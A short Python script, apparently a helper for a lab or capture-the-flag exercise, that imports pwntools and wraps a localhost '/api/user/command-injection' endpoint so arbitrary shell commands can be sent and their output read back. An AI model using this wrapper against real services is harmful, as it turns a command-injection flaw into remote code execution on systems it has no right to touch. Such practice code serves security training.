import requests
import pwn


def exec(command: str) -> tuple[str, str]:
    """Executes the given command one the remote machine."""
    headers = {"Content-Type": "text/plain"}
    response = requests.post(
        "http://localhost:8080/api/user/command-injection",
        headers=headers,
        data=command,
    )
    body = response.json()

    if "err" in body:
        print(body)
        raise Exception(body["err"])

    return body["stdout"], body["stderr"]
